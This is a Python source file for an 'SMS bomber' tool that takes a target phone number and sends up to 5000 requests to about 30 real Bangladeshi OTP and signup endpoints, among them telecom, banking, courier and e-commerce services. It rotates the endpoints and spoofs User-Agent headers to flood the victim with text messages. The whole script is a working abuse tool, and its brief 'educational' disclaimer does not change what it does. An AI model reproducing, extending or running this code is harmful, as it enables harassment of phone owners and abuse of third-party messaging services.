#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    RNASAKS ADVANCED SMS BOMBER v6.0                           ║
║                      REAL OTP TRACKER | DRAGON EDITION                        ║
║                          DEVELOPED BY: Konok Kibriya                          ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import requests
import json
import pyfiglet
import time
import sys
import random
import re
from datetime import datetime
from colorama import init, Fore, Style, Back
import os
import signal

# Initialize colorama
init(autoreset=True)

# Color definitions
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE
BD = Style.BRIGHT
RS = Style.RESET_ALL
DM = Style.DIM

# Global variables
stop_attack = False

def signal_handler(sig, frame):
    global stop_attack
    print(f"\n\n{Y}{BD}⚠️ INTERRUPTED BY USER{RS}\n")
    stop_attack = True
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033]0;RNASAKS SMS BOMBER v6.0 | REAL OTP TRACKER\007", end="")

def loading_animation(text, duration=1):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        sys.stdout.write(f'\r{chars[i % len(chars)]} {text}')
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write('\r✓ ' + text + ' ' * 30 + '\n')

class RealOTPTracker:
    """Real OTP tracking - only counts when OTP is actually sent"""
    def __init__(self):
        self.real_success = 0  # Real OTP sent
        self.api_success = 0   # API returned success but no OTP
        self.failed = 0
        self.total = 0
        self.start_time = None
        self.current_cycle = 0
        self.total_cycles = 0
        self.target_phone = ""
        self.received_otps = []  # Store received OTPs
        
    def start(self):
        self.start_time = datetime.now()
        
    def get_elapsed(self):
        if self.start_time:
            elapsed = datetime.now() - self.start_time
            return str(elapsed).split('.')[0]
        return "0:00:00"
    
    def add_real_success(self, api_name, response_text=""):
        self.real_success += 1
        self.total += 1
        # Extract OTP if present
        otp = self.extract_otp(response_text)
        if otp:
            self.received_otps.append({"api": api_name, "otp": otp, "time": datetime.now()})
        
    def add_api_success(self):
        self.api_success += 1
        self.total += 1
        
    def add_failed(self):
        self.failed += 1
        self.total += 1
        
    def get_real_success_rate(self):
        if self.total == 0:
            return 0
        return (self.real_success / self.total) * 100
    
    def extract_otp(self, text):
        """Extract OTP code from response text"""
        patterns = [
            r'(\d{4,6})',  # 4-6 digit codes
            r'OTP[:\s]*(\d{4,6})',
            r'code[:\s]*(\d{4,6})',
            r'verification[:\s]*(\d{4,6})',
            r'pin[:\s]*(\d{4,6})'
        ]
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(1)
        return None
    
    def get_speed(self):
        if self.start_time:
            elapsed_seconds = (datetime.now() - self.start_time).total_seconds()
            if elapsed_seconds > 0:
                return self.total / elapsed_seconds
        return 0

tracker = RealOTPTracker()

# ======================== DRAGON BANNER ========================
DRAGON_BANNER = f"""
{R}{BD}                                                   ╔══════════════════════════════════╗{RS}
{R}{BD}                                              ╔═══╣{RS}  {Y}{BD}🐉 RNASAKS DRAGON EDITION 🐉{RS}  {R}{BD}╠═══╗{RS}
{R}{BD}                                        ╔═════╣   {C}{BD}⚡ REAL OTP TRACKER v6.0 ⚡{RS}   {R}{BD}╠═════╗{RS}
{R}{BD}                                        ║     ╚══════════════════════════════════╝     ║{RS}
{R}{BD}                                        ║                    {G}{BD}KONOK KIBRIYA{RS}                      ║{RS}
{R}{BD}          ⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀             ║{RS}
{R}{BD}     ⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⽽⣿⣿⣷⣦⣄⡀        ║{RS}
{R}{BD}    ⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀     ║{RS}
{R}{BD}   ⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀   ║{RS}
{R}{BD}   ⣿⣿⣿⢟⣵⣾⣿⣿⣿⣷⣈⠁⠀⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄  ║{RS}
{R}{BD}   ⣿⣿⣿⣿⡹⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄ ║{RS}
{R}{BD}   ⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆ ║{RS}
{R}{BD}   ⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦  ║{RS}
{R}{BD}   ⣿⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁  ⠟⠁⡟⠀⠈⠻    ║{RS}
{R}{BD}   ⣿⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ║{RS}
{R}{BD}   ⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ║{RS}
{R}{BD}   ⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     ║{RS}
{R}{BD}                                                   ╚══════════════════════════════════╝{RS}"""

# ======================== KONOK KIBRIYA CREDITS ========================
CREDITS_BANNER = f"""
{C}{BD}╔══════════════════════════════════════════════════════════════════════════════════════════╗{RS}
{C}{BD}║{RS}  {Y}{BD}╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗{RS}  {C}{BD}║{RS}
{C}{BD}║{RS}  {Y}{BD}┃{RS}              {R}{BD}🐉 DEVELOPED BY: {G}{BD}KONOK KIBRIYA{RS}                              {Y}{BD}┃{RS}  {C}{BD}║{RS}
{C}{BD}║{RS}  {Y}{BD}┃{RS}              {R}{BD}🐙 GITHUB: {C}{BD}https://github.com/KonokKibriya{RS}                     {Y}{BD}┃{RS}  {C}{BD}║{RS}
{C}{BD}║{RS}  {Y}{BD}┃{RS}              {R}{BD}📘 FACEBOOK: {C}{BD}https://www.facebook.com/konokkibriya{RS}             {Y}{BD}┃{RS}  {C}{BD}║{RS}
{C}{BD}║{RS}  {Y}{BD}┃{RS}              {R}{BD}📨 TELEGRAM: {C}{BD}@KonokKibriya{RS}                                    {Y}{BD}┃{RS}  {C}{BD}║{RS}
{C}{BD}║{RS}  {Y}{BD}╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝{RS}  {C}{BD}║{RS}
{C}{BD}║{RS}                                                                                          {C}{BD}║{RS}
{C}{BD}║{RS}  {R}{BD}⚠️  DISCLAIMER:{RS}    {W}{BD}This tool is for educational & authorized testing only{RS}                {C}{BD}║{RS}
{C}{BD}╚══════════════════════════════════════════════════════════════════════════════════════════╝{RS}"""

# ======================== API LIST (40+ APIs) ========================
API_LIST = [
    # Rokomari - Confirmed Working
    {"id": "RK01", "name": "Rokomari OTP", "url": "https://www.rokomari.com/otp/send?emailOrPhone=88{phone}&countryCode=BD", "method": "post", "body": "", "headers": {"content-type": "application/json", "User-Agent": "Mozilla/5.0"}},
    
    # GP APIs
    {"id": "GP01", "name": "GP MyGP", "url": "https://api.mygp.cinematic.mobi/api/v1/otp/{phone}/SBENT_3GB7D", "method": "post", "body": "", "headers": {"content-type": "application/json"}},
    {"id": "GP02", "name": "GP WebLogin", "url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "method": "post", "body": "{\"msisdn\":\"{phone}\"}", "headers": {"content-type": "application/json"}},
    {"id": "GP03", "name": "GP Flexi Plan", "url": "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation", "method": "post", "body": "{\"payment_mode\":\"mobile_balance\",\"longevity\":7,\"voice\":25,\"data\":1536,\"fourg\":0,\"bioscope\":0,\"sms\":0,\"mca\":0,\"msisdn\":\"{phone}\",\"price\":93.52,\"bundle_id\":17130,\"is_login\":false}", "headers": {"content-type": "application/json"}},
    
    # Robi APIs
    {"id": "R01", "name": "Robi Circle", "url": "https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn={phone}", "method": "get", "body": "", "headers": {"content-type": "application/x-www-form-urlencoded"}},
    {"id": "R02", "name": "Robi Cinespot", "url": "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-{phone}/operator-Robi/send", "method": "get", "body": "", "headers": {"content-type": "application/x-www-form-urlencoded"}},
    
    # Banglalink APIs
    {"id": "BL01", "name": "Banglalink Tap", "url": "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp", "method": "post", "body": "{\"deviceId\":\"7dtdhid45c0f5678\",\"deviceInfo\":{\"deviceInfoSignature\":\"D0923F3GDHJXJDTIHFDTIGGHURHFATGHIYAGTAJ\",\"deviceId\":\"7d8b0agi0g0f0568\",\"firebaseDeviceToken\":\"\",\"manufacturer\":\"MI\",\"modelName\":\"NOTE 10\",\"osFirmWireBuild\":\"\",\"osName\":\"Android\",\"osVersion\":\"10\",\"rootDevice\":0},\"operator\":\"Bl\",\"walletNumber\":\"{phone}\"}", "headers": {"content-type": "application/json"}},
    {"id": "BL02", "name": "Banglalink Quizgiri", "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", "method": "post", "body": "{\"phone\":\"{phone}\",\"country_code\":\"+88\",\"fcm_token\":null}", "headers": {"content-type": "application/json"}},
    
    # Airtel APIs
    {"id": "AT01", "name": "Airtel Login OTP", "url": "https://api.bd.airtel.com/v1/account/login/otp", "method": "post", "body": "{\"phone_number\":\"{phone}\"}", "headers": {"content-type": "application/json"}},
    {"id": "AT02", "name": "Airtel Register OTP", "url": "https://api.bd.airtel.com/v1/account/register/otp", "method": "post", "body": "{\"phone_number\":\"{phone}\"}", "headers": {"content-type": "application/json"}},
    
    # Service APIs
    {"id": "SV01", "name": "Shadhin Music", "url": "https://shadhinapp.com/v3/api/sms", "method": "post", "body": "{\"phone\":\"{phone}\"}", "headers": {"content-type": "application/json"}},
    {"id": "SV02", "name": "Shikho Learning", "url": "https://api.shikho.com/auth/v2/send/sms", "method": "post", "body": "{\"phone\":\"{phone}\",\"type\":\"student\",\"auth_type\":\"signup\",\"vendor\":\"shikho\"}", "headers": {"content-type": "application/json"}},
    {"id": "SV03", "name": "Arogga Health", "url": "https://api.arogga.com/v1/auth/sms/send", "method": "post", "body": "mobile=%2B88{phone}&fcmToken=&referral=", "headers": {"content-type": "application/x-www-form-urlencoded"}},
    {"id": "SV04", "name": "Qcom Ecommerce", "url": "https://auth.qcoom.com/api/v1/otp/send", "method": "post", "body": "{\"mobileNumber\":\"{phone}\"}", "headers": {"content-type": "application/json", "Referer": "https://qcoom.com"}},
    {"id": "SV05", "name": "Chardike", "url": "https://api.chardike.com/api/otp/send", "method": "post", "body": "{\"phone\":\"{phone}\",\"otp_type\":\"login\"}", "headers": {"content-type": "application/json"}},
    
    # HASIB HOSSEN APIs
    {"id": "HH01", "name": "CokeStudio OTP", "url": "https://cokestudio23.sslwireless.com/api/store-and-send-otp", "method": "post", "body": "{\"msisdn\":\"{phone}\",\"name\":\"Test User\",\"email\":\"test@email.com\",\"dob\":\"2000-01-01\",\"occupation\":\"N/A\",\"gender\":\"male\"}", "headers": {"content-type": "application/json"}},
    {"id": "HH02", "name": "Rabbithole OTP", "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP", "method": "post", "body": "{\"mobile\":\"+88{phone}\"}", "headers": {"content-type": "application/json"}},
    {"id": "HH03", "name": "Osudpotro OTP", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "method": "post", "body": "{\"mobile\":\"+88-{phone}\",\"deviceToken\":\"web\",\"language\":\"en\",\"os\":\"web\"}", "headers": {"content-type": "application/json"}},
    {"id": "HH04", "name": "Fundesh OTP", "url": "https://fundesh.com.bd/api/auth/generateOTP?service_key=", "method": "post", "body": "{\"msisdn\":\"{phone}\"}", "headers": {"content-type": "application/json"}},
    {"id": "HH05", "name": "Swap OTP", "url": "https://api.swap.com.bd/api/v1/send-otp", "method": "post", "body": "{\"phone\":\"{phone}\"}", "headers": {"content-type": "application/json"}},
    {"id": "HH06", "name": "Bikroy OTP", "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", "method": "post", "body": "", "headers": {"content-type": "application/json"}},
    {"id": "HH07", "name": "Ecourier OTP", "url": "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}", "method": "get", "body": "", "headers": {"content-type": "application/x-www-form-urlencoded"}},
    {"id": "HH08", "name": "Prothomalo Signup", "url": "https://prod-api.viewlift.com/identity/signup?site=prothomalo", "method": "post", "body": "{\"requestType\":\"send\",\"phoneNumber\":\"+88{phone}\",\"emailConsent\":true,\"whatsappConsent\":false}", "headers": {"content-type": "application/json"}},
    {"id": "HH09", "name": "Hoichoi Signup", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "method": "post", "body": "{\"requestType\":\"send\",\"phoneNumber\":\"+88{phone}\",\"emailConsent\":true,\"whatsappConsent\":true}", "headers": {"content-type": "application/json"}},
    {"id": "HH10", "name": "Paperfly Registration", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "method": "post", "body": "{\"full_name\":\"Konok Kibriya\",\"company_name\":\"RNASAKS\",\"email_address\":\"konok@rnasks.com\",\"phone_number\":\"{phone}\"}", "headers": {"content-type": "application/json"}},
    {"id": "HH11", "name": "Eonbazar Register", "url": "https://app.eonbazar.com/api/auth/register", "method": "post", "body": "{\"mobile\":\"{phone}\",\"name\":\"Konok Kibriya\",\"password\":\"Konok@123\",\"email\":\"konok@rnasks.com\"}", "headers": {"content-type": "application/json"}},
    {"id": "HH12", "name": "Sundarban SendPin", "url": "https://tracking.sundarbancourierltd.com/PreBooking/SendPin", "method": "post", "body": "{\"PreBookingRegistrationPhoneNumber\":\"{phone}\"}", "headers": {"content-type": "application/json"}},
    {"id": "HH13", "name": "1024Tera Register", "url": "https://www.1024tera.com/wap/outlogin/phoneRegister", "method": "post", "body": "{\"phone\":\"{phone}\",\"selectStatus\":\"true\"}", "headers": {"content-type": "application/x-www-form-urlencoded"}},
    {"id": "HH14", "name": "Ultranet OTP", "url": "https://ultranetrn.com.br/fonts/api.php?number={phone}", "method": "get", "body": "", "headers": {"content-type": "application/json"}},
    
    # Banking APIs
    {"id": "BK01", "name": "Dhaka Bank", "url": "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", "method": "post", "body": "{ \"AccessToken\": \"\", \"TrackingNo\": \"\", \"mobileNo\": \"{phone}\", \"otpSms\": \"\", \"product_id\": \"250\", \"requestChannel\": \"MOB\", \"trackingStatus\": 5 }", "headers": {"content-type": "application/json"}},
    
    # Additional APIs
    {"id": "AD01", "name": "Chaina Online", "url": "https://chinaonlineapi.com/api/v1/get/otp?phone={phone}", "method": "get", "body": "", "headers": {"content-type": "application/x-www-form-urlencoded", "token": "gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219"}},
    {"id": "AD02", "name": "Iqra Live", "url": "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}", "method": "get", "body": "", "headers": {"content-type": "application/x-www-form-urlencoded"}},
]

# Keywords that indicate OTP was actually sent
OTP_SUCCESS_KEYWORDS = [
    "code", "otp", "verification", "sent", "success", 
    "verify", "pin", "সফল", "পাঠানো হয়েছে", "সেন্ট"
]

def is_otp_actually_sent(response_text, status_code):
    """Check if OTP was actually sent to the phone"""
    response_lower = response_text.lower()
    
    # Real OTP sent indicators
    real_success_indicators = [
        "sent successfully",
        "otp sent",
        "code sent",
        "verification code",
        "check your phone",
        "otp has been sent",
        "সফলভাবে পাঠানো",
        "ভেরিফিকেশন কোড",
        "পাঠানো হয়েছে"
    ]
    
    for indicator in real_success_indicators:
        if indicator in response_lower:
            return True
    
    # If status is 200 and response contains any OTP keyword
    if status_code == 200:
        for keyword in OTP_SUCCESS_KEYWORDS:
            if keyword in response_lower:
                return True
    
    return False

def send_single_otp(api, phone):
    """Send OTP and determine if actually sent"""
    try:
        url = api["url"].replace("{phone}", phone)
        body = api["body"].replace("{phone}", phone) if api["body"] else ""
        
        headers = api["headers"].copy()
        headers["User-Agent"] = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        ])
        
        start_time = time.time()
        
        if api["method"].lower() == "post":
            if body:
                response = requests.post(url, headers=headers, data=body, timeout=10)
            else:
                response = requests.post(url, headers=headers, timeout=10)
        else:
            response = requests.get(url, headers=headers, timeout=10)
        
        elapsed = (time.time() - start_time) * 1000
        response_text = response.text
        
        # Check if OTP was actually sent
        otp_sent = is_otp_actually_sent(response_text, response.status_code)
        
        # Extract OTP if present
        otp_code = tracker.extract_otp(response_text)
        
        return {
            "success": otp_sent,  # Real OTP sent
            "api_success": response.status_code in [200, 201, 202, 204],  # API returned OK
            "status": response.status_code,
            "time": f"{elapsed:.0f}ms",
            "otp": otp_code,
            "response": response_text[:100]
        }
            
    except requests.exceptions.Timeout:
        return {"success": False, "api_success": False, "status": "Timeout", "time": "10000ms", "otp": None}
    except Exception as e:
        return {"success": False, "api_success": False, "status": "Error", "time": "N/A", "otp": None, "error": str(e)[:40]}

def display_header():
    """Display main header with real-time stats"""
    clear_screen()
    ascii_banner = pyfiglet.figlet_format("RNASAKS", font="slant")
    print(f"{R}{BD}{ascii_banner}{RS}")
    print(DRAGON_BANNER)
    print(CREDITS_BANNER)
    
    # Live Stats Dashboard
    print(f"\n{C}{BD}{'█'*80}{RS}")
    print(f"{Y}{BD}  📱 TARGET: {W}{tracker.target_phone}{RS}                          {Y}{BD}🎯 STATUS: {G}⚡ ATTACKING{RS}")
    print(f"{Y}{BD}  🔄 PROGRESS: {W}{tracker.current_cycle}/{tracker.total_cycles}{RS}                          {Y}{BD}⏱️  ELAPSED: {W}{tracker.get_elapsed()}{RS}")
    print(f"{Y}{BD}  💨 SPEED: {W}{tracker.get_speed():.1f} SMS/sec{RS}                          {Y}{BD}🎯 REAL OTP: {G}{tracker.real_success}{RS}")
    print(f"{C}{BD}{'█'*80}{RS}\n")

def send_bomb_real(phone, total_messages):
    """Real OTP bombing - only counts actual OTP delivery"""
    tracker.total_cycles = total_messages
    tracker.target_phone = phone
    tracker.start()
    
    all_apis = API_LIST.copy()
    api_index = 0
    
    for msg_count in range(total_messages):
        if stop_attack:
            break
            
        tracker.current_cycle = msg_count + 1
        
        # Rotate through APIs
        api = all_apis[api_index % len(all_apis)]
        api_index += 1
        
        # Update display
        display_header()
        
        # Progress bar
        progress = (msg_count + 1) / total_messages * 100
        bar_length = 50
        filled = int(bar_length * progress / 100)
        bar = f"{G}{BD}{'█' * filled}{DM}{'░' * (bar_length - filled)}{RS}"
        
        print(f"{C}{BD}  📡 SENDING OTP REQUEST #{msg_count + 1}{RS}")
        print(f"  {bar} {progress:.1f}%")
        print(f"  {Y}📊 Progress: {msg_count + 1}/{total_messages} messages{RS}\n")
        
        # Send request
        result = send_single_otp(api, phone)
        
        # Update based on actual OTP delivery
        if result["success"]:
            tracker.add_real_success(api["name"], result.get("response", ""))
            status_color = G
            status_icon = "✓"
            status_text = "OTP SENT ✓"
            
            if result.get("otp"):
                print(f"  {G}🔐 OTP CODE: {result['otp']}{RS}")
                
        elif result["api_success"]:
            tracker.add_api_success()
            status_color = Y
            status_icon = "⚠"
            status_text = "API OK? 🤔"
        else:
            tracker.add_failed()
            status_color = R
            status_icon = "✗"
            status_text = "FAILED ✗"
        
        time_display = f"{C}[{result['time']}]{RS}" if result['time'] != "N/A" else ""
        print(f"  {status_color}{status_icon}{RS} {Y}[{api['id']}]{RS} {C}{api['name']:22}{RS} "
              f"{status_color}{status_text:12}{RS} {status_color}⚡{RS} {time_display}")
        
        if not result["success"] and result.get("error"):
            print(f"     {DM}→ {result['error'][:40]}{RS}")
        
        # Real Stats
        print(f"\n  {G}✓ REAL OTP RECEIVED: {tracker.real_success}{RS}")
        print(f"  {Y}⚠ API SAID SUCCESS: {tracker.api_success}{RS}")
        print(f"  {R}✗ TOTAL FAILED: {tracker.failed}{RS}")
        print(f"  {C}📊 REAL SUCCESS RATE: {tracker.get_real_success_rate():.1f}%{RS}")
        print(f"  {M}🎯 TOTAL REQUESTS: {tracker.total}{RS}")
        
        # 1 second delay between messages
        if msg_count < total_messages - 1:
            time.sleep(1)
    
    # Final summary
    display_header()
    print(f"\n{G}{BD}{'█'*80}{RS}")
    print(f"{G}{BD}  ✅ OPERATION COMPLETED{RS}")
    print(f"  {C}📊 FINAL STATISTICS (REAL OTP TRACKING):{RS}")
    print(f"     {G}✓ REAL OTP SENT: {tracker.real_success}{RS}")
    print(f"     {Y}⚠ API SAID SUCCESS (No OTP): {tracker.api_success}{RS}")
    print(f"     {R}✗ TOTAL FAILED: {tracker.failed}{RS}")
    print(f"     {C}📈 TOTAL REQUESTS: {tracker.total}{RS}")
    print(f"     {G}💹 REAL SUCCESS RATE: {tracker.get_real_success_rate():.1f}%{RS}")
    print(f"     {M}⏱️  TOTAL TIME: {tracker.get_elapsed()}{RS}")
    print(f"     {C}🚀 AVG SPEED: {tracker.get_speed():.1f} SMS/sec{RS}")
    
    # Show received OTPs if any
    if tracker.received_otps:
        print(f"\n  {Y}🔐 OTPs RECEIVED:{RS}")
        for otp_info in tracker.received_otps[:10]:  # Show first 10
            print(f"     {G}→ {otp_info['api']}: {otp_info['otp']}{RS}")
    
    print(f"{G}{BD}{'█'*80}{RS}\n")

def validate_phone(phone):
    """Phone validation"""
    phone = phone.strip().replace(' ', '').replace('-', '')
    
    if phone.startswith('+'):
        phone = phone[1:]
    
    if phone.startswith('880') and len(phone) == 12:
        return phone
    elif phone.startswith('01') and len(phone) == 11:
        return f"88{phone[1:]}"
    elif phone.startswith('1') and len(phone) == 10:
        return f"88{phone}"
    
    return None

def main():
    clear_screen()
    
    print(f"{R}{BD}")
    ascii_main = pyfiglet.figlet_format("RNASAKS BOMBER", font="cyberlarge")
    print(ascii_main)
    
    print(f"{C}{BD}╔{'═'*78}╗{RS}")
    print(f"{C}{BD}║{RS}  {Y}{BD}🐉 REAL OTP TRACKER v6.0 | DRAGON EDITION 🐉{RS}                      {C}{BD}║{RS}")
    print(f"{C}{BD}║{RS}  {W}{BD}⚠️  ONLY COUNTS WHEN OTP ACTUALLY ARRIVES{RS}                               {C}{BD}║{RS}")
    print(f"{C}{BD}║{RS}  {G}{BD}📡 TOTAL APIs: {len(API_LIST)}{RS}  |  {M}{BD}⚡ MAX LIMIT: 5000 SMS{RS}                           {C}{BD}║{RS}")
    print(f"{C}{BD}╚{'═'*78}╝{RS}\n")
    
    print(CREDITS_BANNER)
    print()
    
    # Phone input
    while True:
        phone_input = input(f"{B}{BD}  📱 Enter Target Number (+880XXXXXXXXX): {RS}")
        phone = validate_phone(phone_input)
        if phone:
            print(f"{G}{BD}  ✓ Validated: +{phone}{RS}\n")
            break
        else:
            print(f"{R}{BD}  ✗ Invalid! Use format: 017XXXXXXX or 88017XXXXXXX{RS}\n")
    
    # Message limit input (1 to 5000)
    while True:
        try:
            limit = int(input(f"{B}{BD}  🔢 Enter Number of SMS (1-5000): {RS}"))
            if 1 <= limit <= 5000:
                break
            else:
                print(f"{R}{BD}  ✗ Please enter between 1-5000{RS}")
        except ValueError:
            print(f"{R}{BD}  ✗ Enter a valid number{RS}")
    
    # Calculate total time
    total_time = limit
    minutes = total_time // 60
    seconds = total_time % 60
    
    print(f"\n{Y}{BD}  ⚠️  ATTACK SUMMARY:{RS}")
    print(f"     {C}📱 Target: +{phone}{RS}")
    print(f"     {C}💬 Total SMS: {limit}{RS}")
    print(f"     {C}⏱️  Est. Time: {minutes} min {seconds} sec{RS}")
    print(f"     {C}🚀 Speed: 1 SMS/second{RS}")
    print(f"     {C}🎯 APIs: {len(API_LIST)} endpoints{RS}")
    print(f"     {G}✓ REAL OTP TRACKING ENABLED{RS}")
    print(f"{R}{BD}  ⚠️  Use only on numbers you own or have permission to test{RS}\n")
    
    confirm = input(f"{M}{BD}  🚀 Start Attack? (yes/no): {RS}").lower()
    
    if confirm in ['yes', 'y']:
        print(f"\n{G}{BD}  🚀 INITIATING ATTACK...{RS}\n")
        loading_animation("Initializing Real OTP Tracker", 1)
        loading_animation(f"Loading {len(API_LIST)} API endpoints", 1)
        loading_animation("Establishing connections", 1)
        loading_animation("OTP verification system ready", 1)
        send_bomb_real(phone, limit)
    else:
        print(f"\n{Y}{BD}  ❌ Operation cancelled. Exiting...{RS}\n")
        sys.exit(0)
    
    print(f"\n{C}{BD}{'═'*80}{RS}")
    print(f"{M}{BD}  🐉 THANKS FOR USING RNASAKS REAL OTP TRACKER{RS}")
    print(f"{C}{BD}  📢 DEVELOPED BY KONOK KIBRIYA:{RS}")
    print(f"     {G}🐙 GitHub: https://github.com/KonokKibriya{RS}")
    print(f"     {B}📘 Facebook: https://www.facebook.com/konokkibriya{RS}")
    print(f"     {M}📨 Telegram: @KonokKibriya{RS}")
    print(f"{C}{BD}{'═'*80}{RS}\n")
    
    input(f"{DM}Press Enter to exit...{RS}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Y}{BD}⚠️ ATTACK STOPPED BY USER{RS}\n")
        sys.exit(0)